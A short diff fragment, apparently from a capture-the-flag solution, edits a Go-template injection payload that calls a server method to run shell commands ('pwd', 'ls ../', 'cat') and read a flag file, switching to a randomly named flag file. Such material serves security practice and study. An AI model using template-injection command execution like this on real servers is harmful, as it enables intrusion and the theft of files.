@@ -8,4 +8,4 @@ cat, {{ .FetchServerInfo "pwd" }}
 
 ls2: {{ .FetchServerInfo "ls ../" }}
 
-cat: {{ .FetchServerInfo "cat ./flag.txt" }}
+cat: {{ .FetchServerInfo "cat ./flagc740ef0e34.txt" }}
